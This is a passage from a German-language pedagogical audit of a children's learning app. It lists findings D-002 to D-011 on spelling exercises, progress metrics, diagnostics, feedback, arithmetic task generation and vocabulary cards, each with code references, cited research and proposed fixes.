- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.7): Entscheidungslücken nur als Gerüst ohne Box-Aufstieg.
- **Beschreibung:** - _Konzept:_ Vault 07 und Plan 2.3 sehen für Stufe 4 vor: „Wort aus dem Gedächtnis, Striche zeigen die Länge“. Die Längenhilfe ist dort ausdrücklich gewollt. - _Implementierung:_ Bei sechs von acht Wortboxen unterscheidet sich die typische Fehlschreibung genau durch die **Buchstabenzahl**: - Doppelkonsonant: „Schif“ statt „Schiff“ - ck/tz: „Glük“ statt „Glück“ - ie: „Bine“ statt „Biene“ - Dehnungs-h: „Farrad“ statt „Fahrrad“ - ß/ss: „Strasse“ statt „Straße“ - Die Striche und Lücken beantworten also die Frage, die das Phänomen ausmacht: Ist ein Zusatzbuchstabe nötig oder nicht? In Stufe 4 ist eine zu lange Schreibweise gar nicht eingebbar. „Strasse“ wird zu „Strass“ abgeschnitten (D12), eine fehlende Stelle bleibt als leerer Strich sichtbar. - Die Lückenmuster der Stufen 2 und 3 setzen die Lücken mechanisch und nicht an die kritische Stelle. Beim Dehnungs-h sind 96/108 h verdeckt, aber … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `app/views/wortspeicher/cover-answer.tsx:22-53` (`CoverAnswer`): ein Strich je Buchstabe, `maxLength={slots.length}`, Eingabe wird abgeschnitten - `src/domain/learning-word.ts:24-41` (`buildLearningWordPattern`, `buildLearningWordLengthPattern`): ein Unterstrich je Buchstabe, fester Rhythmus `index % 3` bzw. `% 4`; `repro-d/d-cover-answer.test.tsx` (D12) und D2.
- **Betroffene:** alle Wortspeicher-Nutzer. Besonders betroffen sind Kinder, die bis Stufe 4 üben und nie Stufe 5 oder 6 wählen.
- **Folgen:** - **[H]** Stufe 4 gilt als „aus dem Gedächtnis“ und hebt die Box (D-001), prüft die orthografische Entscheidung aber nicht. - **[F, Übertragungsgrenze]** Das Verdecken-Vergleichen-Format (Cover-Copy-Compare) ist an sich gut belegt (Joseph et al. 2012). Sein Kern ist jedoch das **freie** Aufschreiben ohne Hinweis.
- **Empfehlung (Vorschlag zur Prüfung):** - Stufe 4 mit freiem Eingabefeld ohne Längenstriche anbieten, höchstens mit Silbenbögen. Die Längenstriche als ausdrücklich gekennzeichnete Hilfe einblenden, die den Aufstieg hemmt. - Stufen 2 und 3 als **Entscheidungslücken** an der kritischen Stelle gestalten, z. B. „Stra_e“ mit Auswahl s/ss/ß oder „Fa_rad“, statt Buchstaben abzuzählen. - Die kritische Stelle je Wort über ein Phänomenmuster der Wortbox bestimmen.
- **Aufwand:** M
- **Erfolgskriterium:** - In Stufe 4 sind beliebig lange Eingaben möglich, ohne Hinweis auf die Länge. - Ein Test belegt für jede Phänomen-Wortbox, dass die kritische Stelle in Stufe 2/3 nie über die Lückenzahl erschließbar ist.
- **Quelle:** `agent-d-paedagogik.md`

### D-003 – Keine Kompetenzdiagnostik: kein Eingangstest, keine Kompetenzchecks, keine Lernverlaufsmessung, keine Kompetenzschätzung

- **Bereich:** Diagnostik, adaptive Steuerung
- **Schwere:** P1 — P1, gemessen am erklärten Ziel „diagnosegestützte adaptive Angebote, Kompetenzchecks“
- **Evidenzstatus:** bestätigt (Codeanalyse, D15)
- **Gegenprüfung:** bestätigt (F): Konzeptlücke, kein Defekt – getrennt von Fehlern priorisieren. Diagnostik auf heutigen Daten wäre eine Scheindiagnose; erst Datenvalidität.
- **Beschreibung:** - _Konzept:_ Vault 22 beschreibt einen „Förderkreislauf“, in dem jedes Lernsignal den fachlich passenden nächsten Schritt aktiviert. Vault 08 nennt einen Modus „Lernstandscheck“. - _Implementierung:_ „Adaptiv“ heißt im Code dreierlei: 1. Ein falsch beantwortetes Objekt wird wieder fällig. 2. Leitner-Abstände wachsen. 3. Die Tagesportion mischt Fehler, Wiederholungen und Neues nach festen Kontingenten. - Es gibt keine Einschätzung, **welche Kompetenz** ein Kind beherrscht, etwa welche Rechtschreibphänomene, welche Einmaleinsreihen oder ob der Zehnerübergang sitzt. - Es gibt keinen Einstieg, der Inhalte oder Schwierigkeit vorschlägt, und keinen wiederkehrenden, vergleichbaren Check. - Merkstufe, Wortbox, Zahlenraum und Textschwierigkeit wählt das Kind selbst. Die Empfehlung „empfohlen“ ist der Modus der gespeicherten Stufen. - Einen Lernstandscheck gibt es nicht mehr. - Die erhobenen … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/adaptive-learning.ts:11-45`: zählt nur Aktivitäten, Tage und „verbesserte“ Objekte - `src/domain/learning-recommendation.ts:42-73`: Reihenfolge Fehler > fällig > nächster Schritt - `src/domain/daily-plan.ts:145-213`: Kontingente nach Fälligkeit - `src/integrations/laufdiktat/live-session.ts:28-30`: „TEST“ wird zu „LAUFDIKTAT“ - `app/components/learning-word-app.tsx:232-252`: Stufe von Hand gewählt - `app/frei/mathematics/mental-math-app.tsx:98-112`: Zahlenraum und Rechenart von … (vollständig in `agent-d-paedagogik.md`); Suche D15. Lesen der genannten Funktionen.
- **Betroffene:** - Lehrkräfte, die Förderentscheidungen treffen wollen - Kinder, die ohne Orientierung zwischen 8 Wortboxen, 6 Stufen und 50 Texten wählen
- **Folgen:** - **[H]** Die Plattform kann ihr Kernversprechen „diagnosegestützt“ nicht einlösen. Lernzeit verteilt sich nach Vorliebe und Fälligkeit, nicht nach Förderbedarf. - **[F]** Datengestützte Förderentscheidungen wirken nur, wenn Messung **und** Anpassung erfolgen (Stecker, Fuchs & Fuchs 2005; Jung et al. 2018, g ≈ 0,37 für datenbasierte Individualisierung bei intensivem Förderbedarf). Messung allein wirkt nicht.
- **Empfehlung (Vorschlag zur Prüfung):** siehe Abschnitt 9. Kurz: - Kein langer Eingangstest. - Stattdessen **kurze, parallele Lernverlaufsproben** (3–5 Minuten, alle 2–3 Wochen) auf einer festen, curricular verankerten Itembank. - Dazu ein **transparentes Beherrschungskriterium je Teilkompetenz** aus den Übungsdaten und eine einfache Fehlerklassifikation. - Für Förderdiagnosen bestehende validierte Verfahren nutzen (Levumi, HSP, DEMAT), nicht nachbauen.
- **Aufwand:** L
- **Erfolgskriterium:** - Für jedes Kind liegt je Kernbereich (Grundwortschatz-Rechtschreibung, Einspluseins/Einmaleins) eine Verlaufslinie aus vergleichbaren Proben vor. - Die Tagesportion nutzt den Beherrschungsstand je Teilkompetenz. - Die Lehrkraft sieht je Kind (lokal) die nächsten Förderschwerpunkte.
- **Quelle:** `agent-d-paedagogik.md`

### D-004 – Fortschrittsanzeigen messen Rauschen, Sofortkorrektur oder Wiedererkennung statt Lernzuwachs

- **Bereich:** Fortschrittsdarstellung, Rückmeldung zur Leistung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D9, D10, D1) und bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** 1. **Bestwert:** Jede Wortspeicher-Runde zieht 10 zufällige Wörter aus 100–133. Bei einer wahren Trefferquote von 60 % streut der Rundenwert mit etwa ±15 Prozentpunkten (Standardabweichung). Der Bestwert ist das Maximum dieser verrauschten Werte. Er steigt **ohne jedes Lernen** nach zehn Runden im Mittel von 60 auf 83 %. „Neuer Bestwert!“ erscheint in 15 % der Runden, ebenfalls ohne Lernen (D9). Die Planungsdokumente nennen die eingeschränkte Vergleichbarkeit („nur ungefähr vergleichbar“). Die Oberfläche feiert die Werte trotzdem als Fortschritt. 2. **„Frühere Fehler verbessert“** auf „Mein Fortschritt“ zählt jedes Objekt, das nach einem Fehler irgendwann richtig war. Dazu gehört die Wiederholung 15 Sekunden später direkt nach dem Buchstabenvergleich mit der richtigen Lösung (D10). Das ist Sofortkorrektur nach Vorlage, kein späterer selbstständiger Abruf. 3. **„Gemeistert“ in der … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `app/components/learning-word-app.tsx` (`finish`, „Neuer Bestwert!“) - `src/domain/word-round.ts:86-99` (`sampleRoundWords`, Zufallsauswahl) und `:322-328` (`wordRoundPercent`) - `src/domain/textbox-progress.ts:32` (`TEXTBOX_MASTERED_PERCENT = 90`) - `src/domain/textbox-session.ts:352-366` (`repeatRound`) - `src/domain/adaptive-learning.ts:20-31` (`improvedObjects`) - `app/components/adaptive-progress-panel.tsx:69-70` („frühere Fehler verbessert“); D9, D10. Codepfade wie angegeben.
- **Betroffene:** - Kinder: Selbstbild und Selbstregulation - Lehrkräfte und Eltern: Laufzettel und Fortschrittsseite
- **Folgen:** - **[F]** Rückmeldung wirkt nur, wenn sie zutreffend über den Abstand zum Ziel informiert (Hattie & Timperley 2007). Rückmeldungen auf Selbst- oder Vergleichsebene können Leistung sogar senken (Kluger & DeNisi 1996). - **[H]** Verrauschte „Rekorde“ lehren Kinder, Zufallsschwankungen als Können zu deuten. Auf Dauer entwerten sie die Rückmeldung, weil auch Rückschritte ohne Grund auftreten.
- **Empfehlung (Vorschlag zur Prüfung):** - Fortschritt über **feste, parallele Wortstichproben** oder über den Anteil „Wörter mit Abruf an zwei verschiedenen Tagen“ darstellen, nicht über Rundenmaxima. - Den Bestwert nur innerhalb gleicher Wortmengen vergleichen oder durch einen gleitenden Mittelwert mit Spannweite ersetzen. - „Frühere Fehler verbessert“ erst zählen, wenn der richtige Abruf frühestens am Folgetag und ohne Hilfe erfolgt. - „Gemeistert“ in der Textbox nur für die erste vollständige Einheit eines Tages ohne Wiederholung des Durchgangs werten, oder ganz durch eine Transferprobe ersetzen (D-005).
- **Aufwand:** M
- **Erfolgskriterium:** - Die Simulation D9 zeigt mit der neuen Kennzahl keinen Anstieg bei konstanter Fähigkeit. - D10 liefert 0.
- **Quelle:** `agent-d-paedagogik.md`

### D-005 – Textbox: Der Hauptwert misst vor allem das Behalten des Textes; die Schwerpunktstatistik ist eine Scheindiagnose

- **Bereich:** Textbox, Bewertung, Diagnostik, Arbeitsbelastung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D8, D11); Zeitbedarf als begründetes Risiko
- **Gegenprüfung:** Teilaussage abgeschwächt (F, Teil 2.6): Zeitbedarf beruht auf angenommener Tippgeschwindigkeit; ein Durchgang „leicht“ passt eher in 10 Minuten.
- **Beschreibung:** - _Konzept:_ Vault 24 und Entscheidung 54 beschreiben ein Rechtschreibtraining für Kinder mit LRS. Die Grenze „trainiert auch das Gedächtnis“ ist benannt. - _Implementierung, Durchgang 4:_ Der Hauptwert verlangt, einen Text von 30–180 Wörtern nach 60–120 Sekunden Merkzeit **vollständig aus dem Gedächtnis** in richtiger Reihenfolge zu schreiben. Vergessene Wörter zählen als Fehler, umgestellte Wörter als Fehler und zusätzlich als Abzug. - Ein Kind, das **fehlerfrei** schreibt, aber zwei Sätze vergisst, erhält 62 %. - Ein Kind, das jedes vierte Wort **falsch** schreibt, aber alles behält, erhält 73 % (D8). - Die Kennzahl ordnet also vor allem nach Arbeitsgedächtnis und Textbehalten. Die Zielgruppe LRS ist hier überdurchschnittlich oft eingeschränkt. - Die Fortschrittsseite zeigt „Schwerpunkte mit den meisten Fehlern“ und verlinkt die passende Wortbox. Dabei wird **jedes** falsche und … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/textbox-session.ts:270-339` (`submitRound`, Durchgang 4 mit `alignWords`) - `src/domain/text-compare.ts:133-198` (`alignWords`) und `:256-285` (`scoreWords`) - `src/domain/textbox-progress.ts:192-218` (`phenomenonErrorStats`) - `src/domain/textbox-session.ts:156` (`memorizeSeconds`); D8, D11 in `repro-d/d-paedagogik.test.ts`.
- **Betroffene:** - Kinder mit LRS und Arbeitsgedächtnisschwäche - Lehrkräfte, die die Schwerpunktstatistik als Diagnose lesen
- **Folgen:** - **[F]** Bei Kindern mit Lese-Rechtschreibschwierigkeiten ist das phonologische Arbeitsgedächtnis häufig eingeschränkt (z. B. Steinbrink & Klatte 2008, n. o. v.). Hohe Gedächtnislast konkurriert mit der Rechtschreibentscheidung (Cognitive-Load-Theorie, Sweller). - **[H]** Fehlzuweisungen führen zu falschen Übungsempfehlungen. Niedrige Werte durch Vergessen können demotivieren, obwohl die Rechtschreibung gut war.
- **Empfehlung (Vorschlag zur Prüfung):** - Durchgang 4 als **Diktat** gestalten: satzweise vorlesen (Sprachausgabe vorhanden), dann schreiben. Alternativ zwei Kennzahlen getrennt zeigen: **Rechtschreibquote** = richtig geschriebene ÷ geschriebene Originalwörter, und **Vollständigkeit**. - Die Schwerpunktstatistik nur aus **Zielwörtern** bzw. phänomentragenden Wörtern berechnen und als Quote ausweisen. - Eine Transferprobe mit ungeübtem Paralleltext desselben Schwerpunkts als eigentlichen Lernnachweis anbieten. - Merkzeit und Länge für „leicht“ an der Zielgruppe ausrichten. - Zielgröße „10 Minuten“ für leicht prüfen, z. B. 2 Durchgänge plus Diktat.
- **Aufwand:** M
- **Erfolgskriterium:** - Bei D8 erhält „fehlerfrei, zwei Sätze vergessen“ eine Rechtschreibquote von 100 %. - D11 meldet höchstens die tatsächlich fehlerhaften Zielwörter. - Die Median-Einheitsdauer aus `writingMs` im Probedurchlauf liegt bei leicht ≤ 12 Minuten.
- **Quelle:** `agent-d-paedagogik.md`

### D-006 – Fachliche Fehler in Wortlisten, Regeltexten, Zielwörtern und Bedeutungshilfen

- **Bereich:** Inhalte Rechtschreibung (Wortspeicher, Textbox, Stufe 6)
- **Schwere:** P2 — P2. Die Inhalte sind als Entwurf gekennzeichnet, sind aber freigegeben (`frei`) und vermitteln teils falsche Regeln.
- **Evidenzstatus:** bestätigt (Codeanalyse und fachliche Prüfung, D3, D4, D14)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Hauptinstanz hat geprüft, ob das Phänomen-Muster vorkommt. Geprüft wird hier, ob das Wort ein **Beispiel des didaktischen Phänomens** ist. 1. **s, ss und ß: Regeltext widerspricht der eigenen Box.** Angezeigt wird: „Nach langem Vokal steht ß, nach kurzem Vokal ss.“ 26 von 133 Wörtern derselben Box haben einen langen Vokal oder Zwielaut **mit s**: Hase, Nase, Rose, Haus, Maus, Reise, lesen, Gras, Glas, Preis … Die Regel sagt dort ß voraus. Es fehlt die Bedingung „stimmlos“ (Hase/Soße) und die Strategie **Verlängern** (Gras → Gräser, Fuß → Füße). Weitere Mängel derselben Box: - „Sonne, Sand, Salz, Suppe, Sofa“ enthalten kein Entscheidungsproblem. - „das/dass“ ist ein grammatischer Fall, als Einzelwort nicht lösbar. - Als Strategie steht „Ableiten“, der Text empfiehlt „in Silben sprechen“. 2. **Auslautverhärtung: 15/111 Wörter auf -ng** (Ring, lang, jung, Anfang …). Das ist kein … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/german-learning-content.ts:44-56, 88-101, 103-117, 119-132, 177-184` - `src/domain/homophones.ts:25-48` - `src/domain/textbox-library.ts`: TXT-024 (`:427`), TXT-034 (`:616`), TXT-046 (`:891`), TXT-011 (`:176`), TXT-001 (`:10`); D3, D4 (Ausgabe mit allen Wortlisten), D14 (Browser). Fachliche Prüfung durch Lesen.
- **Betroffene:** alle Kinder im Rechtschreibtraining, besonders Kinder, die sich an Regeltexten orientieren. Außerdem die Lehrkraft, die laut `docs/inhalte/` noch prüfen soll.
- **Folgen:** - **[H]** Kinder übernehmen eine falsche Regel („langer Vokal → ß“) und übergeneralisieren („Haße“). - **[H]** Strategiehinweise passen nicht zum Wort und verlieren dadurch ihre Glaubwürdigkeit.
- **Empfehlung (Vorschlag zur Prüfung):** - Wortlisten nach den Prinzipien des Grundwortschatzes neu ordnen: Dehnungs-h und silbentrennendes h trennen, -ng entfernen. - Den s/ss/ß-Regeltext korrigieren: „Hör genau: summt das s (Hase) → s. Zischt es nach langem Vokal (Soße) → ß, nach kurzem Vokal (Tasse) → ss. Am Wortende: verlängern.“ - Strategie je Wort statt je Box angeben. - Bedeutungshilfen ohne Zielwort formulieren. - „Weg/weg“ aus der Gruppe nehmen. - Einen Prüftest ergänzen, der Hinweise auf das Zielwort prüft. - Die Lehrkraft-Prüfliste aus `docs/inhalte/` **vor** dem Einsatz abarbeiten. Bis dahin die betroffenen Boxen kennzeichnen.
- **Aufwand:** M (inhaltlich), S je Einzelkorrektur
- **Erfolgskriterium:** - D3 liefert 0 bei -ng, silbentrennendem h und Langvokal-s ohne passenden Regeltext. - D4 liefert 0. - Die Prüfliste in `docs/inhalte/textbox.md` und `wortspeicher.md` ist abgehakt.
- **Quelle:** `agent-d-paedagogik.md`

### D-007 – Wortboxen ohne Kontraste, ohne Niveaustufen und ohne lernstandsbezogene Auswahl

- **Bereich:** Wortspeicher, Differenzierung, Interleaving, Progression
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse); Wirkung als begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** 1. **Nur Positivbeispiele:** - Die Dehnungs-h-Box enthält nur Wörter mit h. Die meisten langen Vokale im Deutschen sind aber **unmarkiert** (Tal, Schule, Name). - Die ie-Box enthält nur ie, nie i (Kino, Tiger, mir). - Die ä-Box enthält nur ä, nie e. - Wer weiß, in welcher Box er übt, kennt die Antwort auf die Phänomenfrage. Die Unterscheidung, die im freien Schreiben verlangt wird, wird nie geübt. Ausnahme ist s/ss/ß. 2. **Keine Niveaustufen:** - Grundschulwörter (Hund, Kind) stehen neben Sek-I-Wortschatz (Vertrag, Verletzung, Übersetzung, Gesetz, Niveau, Saison, Universität, Praktikum, Vertrieb, Tugend). - Eine 10er-Runde für ein Kind der 2. Klasse kann davon mehrere enthalten. - Es gibt keine Zuordnung zu Jahrgangsstufen oder zum bayerischen Grundwortschatz (623 Wörter bis Jahrgangsstufe 4). 3. **Auswahl ohne Lernstand:** „Nochmal üben“ zieht reinen Zufall. Bereits sichere Wörter … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/german-learning-content.ts:16-132` (Listen) - `src/domain/word-round.ts:86-99` (`sampleRoundWords`: Zufall ohne Lernstand) - `app/components/learning-word-app.tsx:288-296` (`random: Math.random`); Lesen der Listen. D3 (Mehrfachzuordnungen). Codepfad der Auswahl.
- **Betroffene:** jüngere Kinder (2./3. Klasse), schwache Rechtschreiber, DaZ (Instanz E).
- **Folgen:** - **[F, Übertragungsgrenze]** Interleaving hilft vor allem beim Unterscheiden ähnlicher Kategorien. Für Wortlisten ohne Unterscheidungsaufgabe ist es nicht belegt (Brunmair & Richter 2019, n. o. v.). - **[H]** Blockweises Üben einer Minderheitenschreibung (h, ie, ä) fördert Übertragung auf Wörter ohne Markierung („Schuhle“, „Tieger“). - **[H]** Überforderung durch unpassende Wörter und Lernzeit für bereits Gekonntes.
- **Empfehlung (Vorschlag zur Prüfung):** - Je Phänomen eine **Kontrastbox**, z. B. „Mit oder ohne h?“, „i oder ie?“, „e oder ä?“, mit Entscheidungsaufgabe. - Wörter mit Niveau kennzeichnen (Grundwortschatz 1/2, 3/4, Sek I) und standardmäßig nach Jahrgang filtern. - Die Rundenauswahl gewichten: ungeübte und fehlerhafte Wörter bevorzugen, sichere nur gelegentlich einstreuen.
- **Aufwand:** M
- **Erfolgskriterium:** - Jede Phänomenbox hat einen Kontrastanteil von mindestens 30 %. - Ein Kind mit Jahrgangsstufe 2 erhält nur Wörter der Stufe 1/2. - Der Anteil sicherer Wörter in Runden liegt bei höchstens 20 %.
- **Quelle:** `agent-d-paedagogik.md`

### D-008 – Rückmeldungen überwiegend „richtig/falsch“: kein Fehlerort, keine Strategie, keine Fehlerklassifikation

- **Bereich:** Feedback aller Module
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D6) und bestätigt (Codeanalyse)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.9): Fehlerklassifikation nur für die Lehrkraft mit sichtbarer Unsicherheit, dem Kind nur die Übungsempfehlung.
- **Beschreibung:** - **Laufdiktat**, live und allein, ist das Unterrichtsformat für Texte. Ein Satz ist nur richtig, wenn er **zeichengenau** stimmt. Ein fehlender Punkt oder ein doppeltes Leerzeichen macht den ganzen Satz falsch (D6). Die Rückmeldung nennt **nicht, welches Wort** falsch war. Live wird die Eingabe gelöscht. Das Kind schreibt den ganzen Abschnitt neu, oft mit demselben Fehler. - **Kopfrechnen:** „Noch nicht – probiere es erneut“, ohne Hinweis auf eine Strategie, etwa Zerlegen am Zehner, Nachbaraufgabe oder Umkehraufgabe. - **Wortspeicher:** Der Buchstabenvergleich ist gut (Aufgabenebene). Ein Bezug zur Strategie der Box fehlt, etwa „Verlängere: Hunde → d“. - **Keine Fehlerart wird diagnostisch klassifiziert.** Möglich wären mit vorhandenen Daten: - Rechtschreibung: Phonem-Graphem-Fehler (Auslassung, falscher Laut), Regelfehler an der kritischen Stelle, Groß-/Kleinschreibung, Vertauschung … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `app/frei/german/laufdiktat/running-dictation-app.tsx:89-118, 432-455` - `src/domain/running-dictation.ts:103-122` (`checkRunningDictationAnswer`, Text: `input.trim() === item.target`) - `app/raum/spiel/live-game.tsx:665-742` („Noch nicht richtig. Versuche es erneut.“, Eingabe wird geleert) - `src/integrations/laufdiktat/live-session.ts:99-129` - `app/frei/mathematics/mental-math-app.tsx:862, 869-886` - `app/views/wortspeicher/feedback-panel.tsx:11-18`; D6. Lesen der Rückmeldetexte.
- **Betroffene:** alle Kinder, besonders LRS und Rechenschwäche. Lehrkräfte, die Fehlerarten wissen müssten.
- **Folgen:** - **[F]** Informationsreiche Rückmeldung wirkt stärker als bloße Richtig/Falsch-Angabe (Wisniewski, Zierer & Hattie 2020, n. o. v.; Shute 2008). Bei einfachen Faktenaufgaben genügt oft die Angabe der richtigen Lösung. Bei Sätzen und Strategieaufgaben nicht. - **[F]** Zahlendreher sind ein sprachspezifisches Risiko deutschsprachiger Kinder (Zuber et al. 2009, n. o. v.). - **[H]** Unlokalisierte Fehlermeldungen führen zu Raten und Frust.
- **Empfehlung (Vorschlag zur Prüfung):** - Laufdiktat-Text wortweise mit `alignWords`/`compareGaps` auswerten, wie in Textbox und Wortspeicher. Fehlerwort markieren, richtige Wörter stehen lassen. Satzzeichen und Leerzeichen als Hinweis, nicht als Fehler. - Mathe: eine regelbasierte Fehlerklassifikation, etwa zehn Regeln als reine Funktion. Je Fehlerart ein kurzer Strategiehinweis und eine passende Nachfolgeaufgabe. - Wortspeicher: die Strategie der Box bzw. des Worts in der Fehlerrückmeldung anzeigen.
- **Aufwand:** M
- **Erfolgskriterium:** - D6 liefert für „fehlender Punkt“ ein „richtig mit Hinweis“. - Ein Testkatalog mit je 3 Beispielen pro Mathe-Fehlerart wird korrekt klassifiziert.
- **Quelle:** `agent-d-paedagogik.md`

### D-009 – Kopfrechnen: grobe Aufgabenfamilien, viele triviale Aufgaben, keine Messung der Rechenflüssigkeit

- **Bereich:** Mathematik, Aufgabenqualität, Diagnostik
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D7) und bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** 1. **Verteilung:** Operanden sind gleichverteilt. - Im Standard (+/−, 0–20) haben 26 % der Aufgaben einen Operanden 0 oder 1, aber nur 27 % einen Zehnerübergang. Der Zehnerübergang ist die zentrale Hürde des Zahlenraums bis 20. - Im Einmaleins ohne gewählte Reihe sind ~26 % ×0/×1 und ~16 % ×10. - Kernaufgaben, Tauschaufgaben und Analogien (7+8 → 17+8) werden nicht gezielt erzeugt. 2. **Familien zu grob:** „Addition, ohne Lücke, bis 100“ fasst 34+5 und 37+48 zusammen. Die Fehlerübung erzeugt neue Aufgaben derselben Familie zufällig, also oft **ohne** die Schwierigkeit, an der der Fehler lag. 3. **Nur Richtigkeit zählt, nie die Zeit:** - Ein Kind, das 7+8 sicher, aber zählend löst, gilt als beherrschend. - Eine richtige Erstantwort erzeugt **nie** eine Wiederholung. - Nach 4 sauberen Antworten (1/3/7/14 Tage) gilt ein Posten als gefestigt und wird nie wieder angeboten. - Die … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/mental-math.ts:447-525` (`generateOperands`, Gleichverteilung) - `src/domain/math-practice.ts:270-300` (`mathFamilyKey`) und `:171-227` (`mathReviews`) - `app/frei/mathematics/mental-math-app.tsx:98-112` (Standard +/−, 0–20); D7.
- **Betroffene:** Kinder mit Rechenschwierigkeiten, besonders beim Ablösen vom zählenden Rechnen. Lehrkräfte.
- **Folgen:** - **[F, n. o. v.]** Verfestigtes zählendes Rechnen gilt in der deutschsprachigen Mathematikdidaktik als zentraler Risikofaktor (Gaidoschik 2010; Häsel-Weide et al. 2013). Antwortzeiten sind ein üblicher Hinweis darauf, ob ein Ergebnis abgerufen oder gezählt wird. Der Hinweis ist nicht eindeutig. - **[H]** Ein Drittel der Übungszeit fließt im Standard in Aufgaben ohne Lerngehalt.
- **Empfehlung (Vorschlag zur Prüfung):** - Den Generator nach **Aufgabentypen** gewichten: Zehnerübergang, Verdoppeln, Fast-Verdoppeln, Kern- und Nachbaraufgaben. Triviale Aufgaben auf höchstens 5 % begrenzen. - Familien um das Merkmal „Übergang ja/nein“ und um den Stellenwerttyp (ZE+E, ZE+ZE) erweitern. - Antwortzeit **lokal erfassen** (nur zur Diagnose, nicht für Punkte). Daraus „richtig und flüssig“ (z. B. < 3 s, kalibrierbar) gegen „richtig, aber langsam“ unterscheiden. - Basisfakten auch nach richtiger Erstantwort gelegentlich wiederholen.
- **Aufwand:** M
- **Erfolgskriterium:** - D7 zeigt im Standard ≥ 50 % Zehnerübergang und ≤ 5 % triviale Aufgaben. - Die Fortschrittsseite zeigt je Einmaleinsreihe „sicher und flüssig“.
- **Quelle:** `agent-d-paedagogik.md`

### D-010 – LernBox: Selbsteinschätzung hebt bis Box 5; die getrennten Stände „Bedeutung“ und „Schreiben“ aus dem Konzept fehlen im Kartenmodell

- **Bereich:** LernBox/Vokabeln
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D5) und bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - _Konzept:_ Vault 03 sagt zu Karteikarten: „Dieser schwächere Nachweis … erlaubt wegen der gezeigten Lösung keinen regulären Aufstieg.“ Vault 06 nennt „Bedeutung richtig, Schreibfehler → Wissen bleibt, Schreiben fällt“ und „zweite Chance“. - _Implementierung:_ Fünfmal „Gewusst“ nach dem Aufdecken an fälligen Tagen ergibt Box 5 (D5). Das gespeicherte Ereignis behauptet dagegen `help: "solution"`. Das ist ein weiterer Widerspruch im Sinne von A-004. - Eine Karte hat je Richtung nur **einen** Stand. Ein Tippfehler bei bekannter Bedeutung setzt auf Box 1, auch für Kinder mit LRS. Die Schreiberleichterung gilt nur im Live-Raum. - Die „zweite Chance“ existiert in der Fachlogik, die Oberfläche ruft sie nie auf.
- **Belege:** - `src/domain/learning-box.ts:352-433` (`processLearningBoxResult`: `mode` beeinflusst nur `writingStreak`) - `app/components/learning-box-app.tsx:392-440` (`assess`: kein `secondChance`) - `src/domain/learning-box-replay.ts:49-71` (Ereignis `help: "solution"` bei Selbsteinschätzung); D5.
- **Betroffene:** Vokabellernende (Englisch GS 3/4, Mittelschule), Kinder mit LRS.
- **Folgen:** - **[F, n. o. v.]** Lernende überschätzen beim Selbstbewerten ihren Abruf und beenden das Üben zu früh. Das senkt die Behaltensleistung (Dunlosky & Rawson 2012). Kinder sind metakognitiv noch ungenauer. - **[H]** Unerkannte Lücken liegen 30 Tage, Tippfehler werfen sichere Bedeutungen zurück. Beides verzerrt die Wiederholung.
- **Empfehlung (Vorschlag zur Prüfung):** - Selbsteinschätzung höchstens bis Box 2 oder 3 zählen lassen, oder nur mit Stichprobenkontrolle (jede dritte Karte schriftlich). - Einen Fast-richtig-Pfad einführen (`isWithinOneEdit`): Box bleibt, früher fällig. - Die zweite Chance in der Oberfläche anbieten. - Getrennte Stände Bedeutung/Schreiben entweder umsetzen oder im Vault streichen.
- **Aufwand:** M
- **Erfolgskriterium:** - D5 endet höchstens in Box 3. - Ein Tippfehler bei Box 4 führt zu Box 4, früher fällig. - Vault und Code stimmen überein.
- **Quelle:** `agent-d-paedagogik.md`

### D-011 – Kein geschlossener Förderkreislauf: Module erzeugen ungleiche oder keine Lernsignale; „20 Aufgaben“ statt eines Zeitbudgets

- **Bereich:** Kohärenz des Lernsystems, Tagesportion
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - _Konzept:_ Vault 22: „Lernraum ist keine Sammlung einzelner Lernprogramme … Jede Übung erzeugt ein Lernsignal, das den fachlich passenden nächsten Schritt aktiviert.“ - _Implementierung:_ - **Laufdiktat allein (Text)** erzeugt **kein** Ereignis und übernimmt nichts. - **Textbox** erzeugt ein Sammelereignis je Einheit (≥ 90 % „richtig“). Fehlerwörter gelangen nur per Klick in den Wortspeicher. - **Tastenwelt** ist nicht Teil der Portion. - **Feste Wortboxen** speisen die Tagesportion nie mit neuen Wörtern. Das Gleiche gilt für Mathe: Ohne Lehrkraft-Vokabeln ist „Heute üben“ für ein Kind rein reaktiv, also nur frühere Fehler und Wiederholungen, ohne curricularen Fortschritt. - Im Unterricht falsch geschriebene Wörter werden in der Portion als „Wiederholung“ einsortiert, nicht als „Fehler“. Sie konkurrieren dadurch mit älteren Wiederholungen. - „20 Aufgaben“ zählt heterogene Einheiten: … (vollständig in `agent-d-paedagogik.md`)
